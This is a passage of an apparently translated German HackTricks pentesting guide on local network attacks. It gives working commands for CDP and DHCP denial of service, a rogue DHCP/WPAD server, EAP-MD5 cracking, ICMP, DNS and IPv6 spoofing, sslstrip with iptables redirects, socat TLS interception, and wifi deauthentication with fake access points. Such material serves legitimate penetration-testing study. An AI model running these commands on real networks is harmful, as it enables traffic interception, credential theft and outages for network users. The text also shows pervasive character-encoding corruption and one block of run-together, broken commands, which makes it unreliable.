Ein aggressiverer Ansatz besteht darin, einen Denial-of-Service (DoS)-Angriff zu starten, indem der Switch-Speicher √ºberlastet wird und vorgegeben wird, legitime CISCO-Ger√§te zu sein. Nachfolgend finden Sie die Befehlssequenz zur Initiierung eines solchen Angriffs mithilfe von Yersinia, einem Netzwerktool, das f√ºr Tests entwickelt wurde:
```bash
sudo yersinia cdp -attack 1 # Initiates a DoS attack by simulating fake CISCO devices
# Alternatively, for a GUI approach:
sudo yersinia -G
```
W√§hrend dieses Angriffs sind die CPU des Switches und die CDP-Nachbartabelle stark belastet, was h√§ufig zu dem f√ºhrt, was oft als **"Netzwerkparalyse"** bezeichnet wird, aufgrund des √ºberm√§√üigen Ressourcenverbrauchs.

#### CDP-Imitationsangriff
```bash
sudo yersinia cdp -attack 2 #Simulate a new CISCO device
sudo yersinia cdp -attack 0 #Send a CDP packet
```
Sie k√∂nnten auch [**scapy**](https://github.com/secdev/scapy/) verwenden. Stellen Sie sicher, dass Sie es mit dem `scapy/contrib` Paket installieren.

### VoIP-Angriffe und das VoIP Hopper-Tool

VoIP-Telefone, die zunehmend mit IoT-Ger√§ten integriert sind, bieten Funktionen wie das Entsperren von T√ºren oder das Steuern von Thermostaten √ºber spezielle Telefonnummern. Diese Integration kann jedoch Sicherheitsrisiken darstellen.

Das Tool [**voiphopper**](http://voiphopper.sourceforge.net) ist darauf ausgelegt, ein VoIP-Telefon in verschiedenen Umgebungen (Cisco, Avaya, Nortel, Alcatel-Lucent) zu emulieren. Es entdeckt die VLAN-ID des Sprachnetzwerks mithilfe von Protokollen wie CDP, DHCP, LLDP-MED und 802.1Q ARP.

**VoIP Hopper** bietet drei Modi f√ºr das Cisco Discovery Protocol (CDP):

1. **Sniff-Modus** (`-c 0`): Analysiert Netzwerkpakete, um die VLAN-ID zu identifizieren.
2. **Spoof-Modus** (`-c 1`): Generiert benutzerdefinierte Pakete, die denen eines tats√§chlichen VoIP-Ger√§ts √§hneln.
3. **Spoof mit vordefiniertem Paketmodus** (`-c 2`): Sendet Pakete, die identisch mit denen eines bestimmten Cisco-IP-Telefonmodells sind.

Der bevorzugte Modus f√ºr Geschwindigkeit ist der dritte. Es erfordert die Angabe von:

* Der Netzwerkschnittstelle des Angreifers (Parameter `-i`).
* Dem Namen des zu emulierenden VoIP-Ger√§ts (Parameter `-E`), unter Einhaltung des Cisco-Namensformats (z. B. SEP gefolgt von einer MAC-Adresse).

In Unternehmenseinstellungen k√∂nnte man, um ein vorhandenes VoIP-Ger√§t zu imitieren:

* Das MAC-Label am Telefon √ºberpr√ºfen.
* Die Anzeigeeinstellungen des Telefons durchsuchen, um Modellinformationen anzuzeigen.
* Das VoIP-Ger√§t an einen Laptop anschlie√üen und CDP-Anfragen mit Wireshark beobachten.

Ein Beispielbefehl zur Ausf√ºhrung des Tools im dritten Modus w√§re:
```bash
voiphopper -i eth1 -E 'SEP001EEEEEEEEE ' -c 2
```
### DHCP-Angriffe

#### Enumeration
```bash
nmap --script broadcast-dhcp-discover
Starting Nmap 7.80 ( https://nmap.org ) at 2019-10-16 05:30 EDT
WARNING: No targets were specified, so 0 hosts scanned.
Pre-scan script results:
| broadcast-dhcp-discover:
|   Response 1 of 1:
|     IP Offered: 192.168.1.250
|     DHCP Message Type: DHCPOFFER
|     Server Identifier: 192.168.1.1
|     IP Address Lease Time: 1m00s
|     Subnet Mask: 255.255.255.0
|     Router: 192.168.1.1
|     Domain Name Server: 192.168.1.1
|_    Domain Name: mynet
Nmap done: 0 IP addresses (0 hosts up) scanned in 5.27 seconds
```
**DoS**

Gegen DHCP-Server k√∂nnen zwei Arten von DoS-Angriffen durchgef√ºhrt werden. Der erste besteht darin, **genug gef√§lschte Hosts zu simulieren, um alle m√∂glichen IP-Adressen zu verwenden**.\
Dieser Angriff funktioniert nur, wenn Sie die Antworten des DHCP-Servers sehen k√∂nnen und das Protokoll abschlie√üen k√∂nnen (**Discover** (Comp) --> **Offer** (Server) --> **Request** (Comp) --> **ACK** (Server)). Zum Beispiel ist dies **in WLAN-Netzwerken nicht m√∂glich**.

Eine andere M√∂glichkeit, einen DHCP-DoS durchzuf√ºhren, besteht darin, ein **DHCP-RELEASE-Paket zu senden, wobei als Quellcode jede m√∂gliche IP-Adresse verwendet wird**. Dann wird der Server denken, dass jeder die IP-Adresse nicht mehr verwendet.
```bash
yersinia dhcp -attack 1
yersinia dhcp -attack 3 #More parameters are needed
```
Eine automatischere Methode, dies zu tun, ist die Verwendung des Tools [DHCPing](https://github.com/kamorin/DHCPig).

Sie k√∂nnten die genannten DoS-Angriffe verwenden, um Clients dazu zu zwingen, neue Leases innerhalb der Umgebung zu erhalten, und legitime Server ersch√∂pfen, sodass sie nicht mehr reagieren. Wenn die legitimen Server versuchen, sich erneut zu verbinden, **k√∂nnen Sie b√∂sartige Werte bereitstellen, die im n√§chsten Angriff erw√§hnt werden**.

#### B√∂sartige Werte setzen

Ein Rogue-DHCP-Server kann mithilfe des DHCP-Skripts unter `/usr/share/responder/DHCP.py` eingerichtet werden. Dies ist n√ºtzlich f√ºr Netzwerkangriffe, wie das Erfassen von HTTP-Verkehr und Anmeldeinformationen, indem der Verkehr zu einem b√∂sartigen Server umgeleitet wird. Das Einrichten eines Rogue-Gateways ist jedoch weniger effektiv, da es nur das Erfassen von ausgehendem Verkehr vom Client erm√∂glicht und die Antworten des echten Gateways verpasst. Stattdessen wird empfohlen, einen Rogue-DNS- oder WPAD-Server f√ºr einen effektiveren Angriff einzurichten.

Nachfolgend sind die Befehlsoptionen f√ºr die Konfiguration des Rogue-DHCP-Servers aufgef√ºhrt:

* **Unsere IP-Adresse (Gateway-Anzeige)**: Verwenden Sie `-i 10.0.0.100`, um die IP Ihres Rechners als Gateway anzuk√ºndigen.
* **Lokaler DNS-Dom√§nenname**: Verwenden Sie optional `-d example.org`, um einen lokalen DNS-Dom√§nennamen festzulegen.
* **Urspr√ºngliche Router-/Gateway-IP**: Verwenden Sie `-r 10.0.0.1`, um die IP-Adresse des legitimen Routers oder Gateways anzugeben.
* **Prim√§rer DNS-Server-IP**: Verwenden Sie `-p 10.0.0.100`, um die IP-Adresse des von Ihnen kontrollierten Rogue-DNS-Servers festzulegen.
* **Sekund√§re DNS-Server-IP**: Verwenden Sie optional `-s 10.0.0.1`, um eine sekund√§re DNS-Server-IP festzulegen.
* **Netzmaske des lokalen Netzwerks**: Verwenden Sie `-n 255.255.255.0`, um die Netzmaske f√ºr das lokale Netzwerk zu definieren.
* **Schnittstelle f√ºr DHCP-Verkehr**: Verwenden Sie `-I eth1`, um auf einem bestimmten Netzwerkinterface nach DHCP-Verkehr zu lauschen.
* **WPAD-Konfigurationsadresse**: Verwenden Sie `-w ‚Äúhttp://10.0.0.100/wpad.dat‚Äù`, um die Adresse f√ºr die WPAD-Konfiguration festzulegen, die bei der Unterst√ºtzung der Webverkehrsinterception hilft.
* **Spoof Default Gateway IP**: F√ºgen Sie `-S` hinzu, um die IP-Adresse des Standard-Gateways zu f√§lschen.
* **Auf alle DHCP-Anfragen antworten**: F√ºgen Sie `-R` hinzu, um den Server dazu zu bringen, auf alle DHCP-Anfragen zu antworten, seien Sie sich jedoch bewusst, dass dies laut ist und erkannt werden kann.

Durch die korrekte Verwendung dieser Optionen kann ein Rogue-DHCP-Server eingerichtet werden, um den Netzwerkverkehr effektiv abzufangen.
```python
# Example to start a rogue DHCP server with specified options
!python /usr/share/responder/DHCP.py -i 10.0.0.100 -d example.org -r 10.0.0.1 -p 10.0.0.100 -s 10.0.0.1 -n 255.255.255.0 -I eth1 -w "http://10.0.0.100/wpad.dat" -S -R
```
### **EAP-Angriffe**

Hier sind einige der Angriffstaktiken, die gegen 802.1X-Implementierungen eingesetzt werden k√∂nnen:

* Aktives Brute-Force-Passwortknacken √ºber EAP
* Angriff auf den RADIUS-Server mit fehlerhaftem EAP-Inhalt _(Exploits)_
* Erfassen von EAP-Nachrichten und Offline-Passwortknacken (EAP-MD5 und PEAP)
* Erzwingen der EAP-MD5-Authentifizierung zur Umgehung der TLS-Zertifikatsvalidierung
* Einschleusen b√∂sartigen Netzwerkverkehrs beim Authentifizieren √ºber einen Hub oder √Ñhnliches

Wenn der Angreifer zwischen dem Opfer und dem Authentifizierungsserver steht, k√∂nnte er versuchen, das Authentifizierungsprotokoll bei Bedarf auf EAP-MD5 herabzustufen und den Authentifizierungsversuch erfassen. Anschlie√üend k√∂nnte er dies durch Brute-Force knacken:
```
eapmd5pass ‚Äìr pcap.dump ‚Äìw /usr/share/wordlist/sqlmap.txt
```
### FHRP (GLBP & HSRP) Angriffe <a href="#id-6196" id="id-6196"></a>

**FHRP** (First Hop Redundancy Protocol) ist eine Klasse von Netzwerkprotokollen, die entwickelt wurden, um **ein hei√ües redundantes Routing-System zu erstellen**. Mit FHRP k√∂nnen physische Router zu einem einzigen logischen Ger√§t kombiniert werden, was die Ausfallsicherheit erh√∂ht und die Last verteilt.

**Ingenieure von Cisco Systems haben zwei FHRP-Protokolle entwickelt, GLBP und HSRP.**

{% content-ref url="glbp-and-hsrp-attacks.md" %}
[glbp-and-hsrp-attacks.md](glbp-and-hsrp-attacks.md)
{% endcontent-ref %}

### RIP

Es sind drei Versionen des Routing Information Protocol (RIP) bekannt: RIP, RIPv2 und RIPng. Datagramme werden von RIP und RIPv2 an Peers √ºber Port 520 mit UDP gesendet, w√§hrend Datagramme von RIPng √ºber IPv6-Multicast an UDP-Port 521 ausgestrahlt werden. RIPv2 f√ºhrte die Unterst√ºtzung f√ºr MD5-Authentifizierung ein. Im Gegensatz dazu ist in RIPng keine native Authentifizierung enthalten; stattdessen wird auf optionale IPsec AH- und ESP-Header innerhalb von IPv6 vertraut.

* **RIP und RIPv2:** Die Kommunikation erfolgt √ºber UDP-Datagramme auf Port 520.
* **RIPng:** Verwendet UDP-Port 521 zur Ausstrahlung von Datagrammen √ºber IPv6-Multicast.

RIPv2 unterst√ºtzt die MD5-Authentifizierung, w√§hrend RIPng keine native Authentifizierung enth√§lt und auf IPsec AH- und ESP-Header in IPv6 angewiesen ist.

### EIGRP Angriffe

**EIGRP (Enhanced Interior Gateway Routing Protocol)** ist ein dynamisches Routingprotokoll. **Es handelt sich um ein Distanzvektorprotokoll.** Wenn **keine Authentifizierung** und Konfiguration von passiven Schnittstellen vorhanden sind, kann ein **Eindringling** in das EIGRP-Routing eingreifen und **Routing-Tabellenvergiftung** verursachen. Dar√ºber hinaus ist das EIGRP-Netzwerk (oder anders ausgedr√ºckt, das autonome System) **flach und nicht in Zonen unterteilt**. Wenn ein **Angreifer eine Route einspeist**, ist es wahrscheinlich, dass sich diese Route im gesamten autonomen EIGRP-System **ausbreitet**.

Um ein EIGRP-System anzugreifen, muss eine **Nachbarschaft mit einem legitimen EIGRP-Router hergestellt** werden, was viele M√∂glichkeiten er√∂ffnet, von grundlegenden Erkundungen bis hin zu verschiedenen Injektionen.

[**FRRouting**](https://frrouting.org/) erm√∂glicht es Ihnen, **einen virtuellen Router zu implementieren, der BGP, OSPF, EIGRP, RIP und andere Protokolle unterst√ºtzt**. Alles, was Sie tun m√ºssen, ist, es auf Ihrem Angreifer-System bereitzustellen, und Sie k√∂nnen tats√§chlich vorgeben, ein legitimer Router im Routing-Dom√§ne zu sein.

{% content-ref url="eigrp-attacks.md" %}
[eigrp-attacks.md](eigrp-attacks.md)
{% endcontent-ref %}

[**Coly**](https://code.google.com/p/coly/) verf√ºgt √ºber Funktionen zum Abfangen von EIGRP (Enhanced Interior Gateway Routing Protocol)-√úbertragungen. Es erm√∂glicht auch die Injektion von Paketen, die zur √Ñnderung von Routing-Konfigurationen genutzt werden k√∂nnen.

### OSPF

Im Open Shortest Path First (OSPF)-Protokoll wird **h√§ufig die MD5-Authentifizierung eingesetzt, um eine sichere Kommunikation zwischen Routern zu gew√§hrleisten**. Diese Sicherheitsma√ünahme kann jedoch mit Tools wie Loki und John the Ripper kompromittiert werden. Diese Tools sind in der Lage, MD5-Hashes zu erfassen und zu knacken, wodurch der Authentifizierungsschl√ºssel offengelegt wird. Sobald dieser Schl√ºssel erhalten ist, kann er verwendet werden, um neue Routing-Informationen einzuf√ºhren. Um die Routenparameter zu konfigurieren und den kompromittierten Schl√ºssel herzustellen, werden die Registerkarten _Injection_ und _Connection_ verwendet.

* **Erfassen und Knacken von MD5-Hashes:** Tools wie Loki und John the Ripper werden f√ºr diesen Zweck verwendet.
* **Konfigurieren von Routenparametern:** Dies erfolgt √ºber die Registerkarte _Injection_.
* **Einstellen des kompromittierten Schl√ºssels:** Der Schl√ºssel wird unter der Registerkarte _Connection_ konfiguriert.

### Andere generische Tools & Quellen

* [**Above**](https://github.com/c4s73r/Above): Tool zum Scannen des Netzwerkverkehrs und zur Suche nach Schwachstellen
* Sie finden weitere Informationen zu Netzwerkangriffen [**hier**](https://github.com/Sab0tag3d/MITM-cheatsheet).

## **Spoofing**

Der Angreifer konfiguriert alle Netzwerkparameter (GW, IP, DNS) des neuen Netzwerkmitglieds, indem er gef√§lschte DHCP-Antworten sendet.
```bash
Ettercap
yersinia dhcp -attack 2 #More parameters are needed
```
### ARP Spoofing

√úberpr√ºfen Sie den [vorherigen Abschnitt](./#arp-spoofing).

### ICMPRedirect

ICMP Redirect besteht darin, ein ICMP-Paket vom Typ 1 Code 5 zu senden, das angibt, dass der Angreifer der beste Weg ist, um eine IP zu erreichen. Wenn das Opfer dann die IP kontaktieren m√∂chte, sendet es das Paket √ºber den Angreifer.
```bash
Ettercap
icmp_redirect
hping3 [VICTIM IP ADDRESS] -C 5 -K 1 -a [VICTIM DEFAULT GW IP ADDRESS] --icmp-gw [ATTACKER IP ADDRESS] --icmp-ipdst [DST IP ADDRESS] --icmp-ipsrc [VICTIM IP ADDRESS] #Send icmp to [1] form [2], route to [3] packets sent to [4] from [5]
```
### DNS Spoofing

Der Angreifer l√∂st einige (oder alle) der Domains auf, nach denen das Opfer fragt.
```bash
set dns.spoof.hosts ./dns.spoof.hosts; dns.spoof on
```
**Konfigurieren Sie Ihre eigene DNS mit dnsmasq**
```bash
apt-get install dnsmasqecho "addn-hosts=dnsmasq.hosts" > dnsmasq.conf #Create dnsmasq.confecho "127.0.0.1   domain.example.com" > dnsmasq.hosts #Domains in dnsmasq.hosts will be the domains resolved by the Dsudo dnsmasq -C dnsmasq.conf --no-daemon
dig @localhost domain.example.com # Test the configured DNS
```
### Lokale Gateways

Oftmals existieren mehrere Routen zu Systemen und Netzwerken. Nachdem eine Liste von MAC-Adressen im lokalen Netzwerk erstellt wurde, verwenden Sie _gateway-finder.py_, um Hosts zu identifizieren, die IPv4-Weiterleitung unterst√ºtzen.
```
root@kali:~# git clone https://github.com/pentestmonkey/gateway-finder.git
root@kali:~# cd gateway-finder/
root@kali:~# arp-scan -l | tee hosts.txt
Interface: eth0, datalink type: EN10MB (Ethernet)
Starting arp-scan 1.6 with 256 hosts (http://www.nta-monitor.com/tools/arp-scan/)
10.0.0.100     00:13:72:09:ad:76       Dell Inc.
10.0.0.200     00:90:27:43:c0:57       INTEL CORPORATION
10.0.0.254     00:08:74:c0:40:ce       Dell Computer Corp.

root@kali:~/gateway-finder# ./gateway-finder.py -f hosts.txt -i 209.85.227.99
gateway-finder v1.0 http://pentestmonkey.net/tools/gateway-finder
[+] Using interface eth0 (-I to change)
[+] Found 3 MAC addresses in hosts.txt
[+] We can ping 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
[+] We can reach TCP port 80 on 209.85.227.99 via 00:13:72:09:AD:76 [10.0.0.100]
```
### [Spoofing LLMNR, NBT-NS, und mDNS](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

F√ºr die lokale Hostaufl√∂sung, wenn DNS-Lookups nicht erfolgreich sind, verlassen sich Microsoft-Systeme auf **Link-Local Multicast Name Resolution (LLMNR)** und den **NetBIOS Name Service (NBT-NS)**. Ebenso nutzen **Apple Bonjour** und **Linux Zero-Configuration**-Implementierungen **Multicast DNS (mDNS)** zur Entdeckung von Systemen innerhalb eines Netzwerks. Aufgrund der nicht authentifizierten Natur dieser Protokolle und ihrer Funktion √ºber UDP, bei der Nachrichten √ºbertragen werden, k√∂nnen sie von Angreifern ausgenutzt werden, die darauf abzielen, Benutzer auf b√∂sartige Dienste umzuleiten.

Sie k√∂nnen Dienste, die von Hosts gesucht werden, durch das Senden gef√§lschter Antworten mit Responder imitieren.\
Lesen Sie hier mehr Informationen dar√ºber, [wie man Dienste mit Responder imitiert](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing WPAD](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md)

Browser verwenden h√§ufig das **Web Proxy Auto-Discovery (WPAD)-Protokoll, um automatisch Proxy-Einstellungen zu erhalten**. Dies beinhaltet das Abrufen von Konfigurationsdetails von einem Server, speziell √ºber eine URL wie "http://wpad.example.org/wpad.dat". Die Entdeckung dieses Servers durch die Clients kann durch verschiedene Mechanismen erfolgen:

* Durch **DHCP**, wobei die Entdeckung durch die Verwendung eines speziellen Code-252-Eintrags erleichtert wird.
* Durch **DNS**, was die Suche nach einem Hostnamen mit dem Label _wpad_ innerhalb der lokalen Dom√§ne beinhaltet.
* √úber **Microsoft LLMNR und NBT-NS**, die als Ausweichmechanismen verwendet werden, wenn DNS-Lookups nicht erfolgreich sind.

Das Tool Responder nutzt dieses Protokoll, indem es als **b√∂sartiger WPAD-Server** fungiert. Es verwendet DHCP, DNS, LLMNR und NBT-NS, um Clients dazu zu verleiten, sich damit zu verbinden. Um tiefer in die Imitation von Diensten mit Responder einzutauchen, [√ºberpr√ºfen Sie dies](spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md).

### [Spoofing SSDP und UPnP-Ger√§te](spoofing-ssdp-and-upnp-devices.md)

Sie k√∂nnen verschiedene Dienste im Netzwerk anbieten, um zu versuchen, **einen Benutzer dazu zu bringen, einige Klartext-Anmeldeinformationen einzugeben**. **Weitere Informationen zu diesem Angriff finden Sie in** [**Spoofing SSDP und UPnP-Ger√§te**](spoofing-ssdp-and-upnp-devices.md)**.**

### IPv6-Nachbarschaftsspoofing

Dieser Angriff √§hnelt sehr dem ARP-Spoofing, jedoch in der IPv6-Welt. Sie k√∂nnen das Opfer dazu bringen, zu glauben, dass die IPv6 des GW die MAC des Angreifers hat.
```bash
sudo parasite6 -l eth0 # This option will respond to every requests spoofing the address that was requested
sudo fake_advertise6 -r -w 2 eth0 <Router_IPv6> #This option will send the Neighbor Advertisement packet every 2 seconds
```
### IPv6 Router Advertisement Spoofing/Flooding

Einige Betriebssysteme konfigurieren standardm√§√üig das Gateway aus den RA-Paketen, die im Netzwerk gesendet werden. Um den Angreifer als IPv6-Router zu deklarieren, k√∂nnen Sie verwenden:
```bash
sysctl -w net.ipv6.conf.all.forwarding=1 4
ip route add default via <ROUTER_IPv6> dev wlan0
fake_router6 wlan0 fe80::01/16
```
### IPv6 DHCP Spoofing

Standardm√§√üig versuchen einige Betriebssysteme, die DNS-Konfiguration durch Lesen eines DHCPv6-Pakets im Netzwerk zu konfigurieren. Ein Angreifer k√∂nnte dann ein DHCPv6-Paket senden, um sich selbst als DNS zu konfigurieren. Der DHCP stellt auch eine IPv6-Adresse f√ºr das Opfer bereit.
```bash
dhcp6.spoof on
dhcp6.spoof.domains <list of domains>

mitm6
```
### HTTP (gef√§lschte Seite und JS-Code-Injektion)

## Internetangriffe

### sslStrip

Im Grunde genommen bewirkt dieser Angriff, dass, falls der **Benutzer** versucht, auf eine **HTTP**-Seite zuzugreifen, die auf die **HTTPS**-Version **weiterleitet**, **sslStrip** eine **HTTP-Verbindung zum** Client und eine **HTTPS-Verbindung zum** Server **aufrechterh√§lt**, um die Verbindung im **Klartext** abzufangen.
```bash
apt-get install sslstrip
sslstrip -w /tmp/sslstrip.log --all - l 10000 -f -k
#iptables --flush
#iptables --flush -t nat
iptables -t nat -A PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 10000
iptables -A INPUT -p tcp --destination-port 10000 -j ACCEPT
```
Mehr Informationen [hier](https://www.blackhat.com/presentations/bh-dc-09/Marlinspike/BlackHat-DC-09-Marlinspike-Defeating-SSL.pdf).

### sslStrip+ und dns2proxy zum Umgehen von HSTS

Der **Unterschied** zwischen **sslStrip+ und dns2proxy** gegen√ºber **sslStrip** besteht darin, dass sie beispielsweise _**www.facebook.com**_ **auf** _**wwww.facebook.com**_ (beachte das zus√§tzliche "**w**") **umleiten** und die **Adresse dieser Domain als die des Angreifer-IPs festlegen**. Auf diese Weise wird der **Client** eine Verbindung zu _**wwww.facebook.com**_ **(dem Angreifer)** herstellen, aber im Hintergrund wird **sslstrip+** die **echte Verbindung** √ºber https mit **www.facebook.com** aufrechterhalten.

Das **Ziel** dieser Technik ist es, **HSTS zu umgehen**, da _**wwww**.facebook.com_ nicht im **Cache** des Browsers gespeichert wird, sodass der Browser get√§uscht wird, die **Facebook-Authentifizierung in HTTP** durchzuf√ºhren.\
Beachten Sie, dass der Angriff nur funktioniert, wenn das Opfer zun√§chst versucht, auf [http://www.faceook.com](http://www.faceook.com) und nicht https zuzugreifen. Dies kann durch √Ñndern der Links innerhalb einer http-Seite erfolgen.

Mehr Informationen [hier](https://www.bettercap.org/legacy/#hsts-bypass), [hier](https://www.slideshare.net/Fatuo\_\_/offensive-exploiting-dns-servers-changes-blackhat-asia-2014) und [hier](https://security.stackexchange.com/questions/91092/how-does-bypassing-hsts-with-sslstrip-work-exactly).

**sslStrip oder sslStrip+ funktioniert nicht mehr. Dies liegt daran, dass im Browser HSTS-Regeln vorgespeichert sind. Selbst wenn ein Benutzer zum ersten Mal auf eine "wichtige" Domain zugreift, wird er dies √ºber HTTPS tun. Beachten Sie auch, dass die vorgespeicherten Regeln und andere generierte Regeln die Flagge** [**`includeSubdomains`**](https://hstspreload.appspot.com) **verwenden k√∂nnen, sodass das vorherige Beispiel mit** _**wwww.facebook.com**_ **nicht mehr funktioniert, da** _**facebook.com**_ **HSTS mit `includeSubdomains` verwendet.**
```bash
sudo nc -l -p 80
socat TCP4-LISTEN:80,fork,reuseaddr -
```
## TCP + SSL h√∂ren am Port

#### Generieren von Schl√ºsseln und selbstsigniertem Zertifikat
```
FILENAME=server
# Generate a public/private key pair:
openssl genrsa -out $FILENAME.key 1024
# Generate a self signed certificate:
openssl req -new -key $FILENAME.key -x509 -sha256 -days 3653 -out $FILENAME.crt
# Generate the PEM file by just appending the key and certificate files:
cat $FILENAME.key $FILENAME.crt >$FILENAME.pem
```
#### Lauschen mit Zertifikat
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0 -
```
#### Zuh√∂ren unter Verwendung des Zertifikats und Umleiten zu den Hosts
```
sudo socat -v -v openssl-listen:443,reuseaddr,fork,cert=$FILENAME.pem,cafile=$FILENAME.crt,verify=0  openssl-connect:[SERVER]:[PORT],verify=0
```
Manchmal, wenn der Kunde √ºberpr√ºft, ob der CA g√ºltig ist, k√∂nnten Sie **ein Zertifikat eines anderen Hostnamens, das von einem CA signiert wurde, bereitstellen**.\
Ein weiterer interessanter Test ist es, **ein Zertifikat des angeforderten Hostnamens, aber selbst signiert, bereitzustellen**.

Andere Dinge, die getestet werden sollten, sind das Versuchen, das Zertifikat mit einem g√ºltigen Zertifikat zu signieren, das jedoch kein g√ºltiger CA ist. Oder den g√ºltigen √∂ffentlichen Schl√ºssel zu verwenden, erzwingen, einen Algorithmus wie Diffie-Hellman zu verwenden (einen, der nichts mit dem echten privaten Schl√ºssel entschl√ºsseln muss) und wenn der Kunde eine √úberpr√ºfung des echten privaten Schl√ºssels anfordert (wie einen Hash), einen gef√§lschten Probe senden und erwarten, dass der Kunde dies nicht √ºberpr√ºft.

## Bettercap
```bash
# Events
events.stream off #Stop showing events
events.show #Show all events
events.show 5 #Show latests 5 events
events.clear

# Ticker (loop of commands)
set ticker.period 5; set ticker.commands "wifi.deauth DE:AD:BE:EF:DE:AD"; ticker on

# Caplets
caplets.show
caplets.update

# Wifi
wifi.recon on
wifi.deauth BSSID
wifi.show
# Fake wifi
set wifi.ap.ssid Banana
set wifi.ap.bssid DE:AD:BE:EF:DE:AD
set wifi.ap.channel 5
set wifi.ap.encryption false #If true, WPA2
wifi.recon on; wifi.ap
```
### Aktive Entdeckungsnotizen

Bitte beachten Sie, dass bei Sendung eines UDP-Pakets an ein Ger√§t, das den angeforderten Port nicht hat, ein ICMP (Port Unreachable) gesendet wird.

### **ARP-Entdeckung**

ARP-Pakete werden verwendet, um herauszufinden, welche IPs im Netzwerk verwendet werden. Der PC muss eine Anfrage f√ºr jede m√∂gliche IP-Adresse senden, und nur diejenigen, die verwendet werden, werden antworten.

### **mDNS (multicast DNS)**

Bettercap sendet alle X ms eine MDNS-Anfrage, die nach **\_services\_.dns-sd.\_udp.local** fragt. Die Maschine, die dieses Paket sieht, antwortet normalerweise auf diese Anfrage. Dann sucht es nur nach Maschinen, die auf "services" antworten.

**Werkzeuge**

* Avahi-Browser (--all)
* Bettercap (net.probe.mdns)
* Responder

### **NBNS (NetBios Name Server)**

Bettercap sendet Rundrufpakete an den Port 137/UDP und fragt nach dem Namen "CKAAAAAAAAAAAAAAAAAAAAAAAAAAA".

### **SSDP (Simple Service Discovery Protocol)**

Bettercap sendet SSDP-Pakete aus, um nach allen Arten von Diensten zu suchen (UDP-Port 1900).

### **WSD (Web Service Discovery)**

Bettercap sendet WSD-Pakete aus, um nach Diensten zu suchen (UDP-Port 3702).

## Referenzen

* [https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@in9uz/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)
* **Network Security Assessment: Know Your Network (3. Auflage)**
* **Practical IoT Hacking: The Definitive Guide to Attacking the Internet of Things. Von Fotios Chantzis, Ioannis Stais, Paulino Calderon, Evangelos Deirmentzoglou, Beau Wood**
* [https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9](https://medium.com/@cursedpkt/cisco-nightmare-pentesting-cisco-networks-like-a-devil-f4032eb437b9)

<img src="../../.gitbook/assets/i3.png" alt="" data-size="original">\
**Bug-Bounty-Tipp**: **Melden Sie sich an** bei **Intigriti**, einer Premium-**Bug-Bounty-Plattform, die von Hackern f√ºr Hacker erstellt wurde! Treten Sie uns bei [**https://go.intigriti.com/hacktricks**](https://go.intigriti.com/hacktricks) bei und beginnen Sie noch heute, Pr√§mien von bis zu **100.000 $** zu verdienen!

{% embed url="https://go.intigriti.com/hacktricks" %}

<details>

<summary><strong>Erlernen Sie AWS-Hacking von Null auf Held mit</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Andere M√∂glichkeiten, HackTricks zu unterst√ºtzen:

* Wenn Sie Ihr **Unternehmen in HackTricks beworben sehen m√∂chten** oder **HackTricks im PDF-Format herunterladen m√∂chten**, √ºberpr√ºfen Sie die [**ABONNEMENTPL√ÑNE**](https://github.com/sponsors/carlospolop)!
* Holen Sie sich das [**offizielle PEASS & HackTricks-Merch**](https://peass.creator-spring.com)
* Entdecken Sie [**The PEASS Family**](https://opensea.io/collection/the-peass-family), unsere Sammlung exklusiver [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Treten Sie der** üí¨ [**Discord-Gruppe**](https://discord.gg/hRep4RUj7f) oder der [**Telegram-Gruppe**](https://t.me/peass) bei oder **folgen** Sie uns auf **Twitter** üê¶ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Teilen Sie Ihre Hacking-Tricks, indem Sie PRs an die** [**HackTricks**](https://github.com/carlospolop/hacktricks) und [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) Github-Repositories einreichen.

</details>
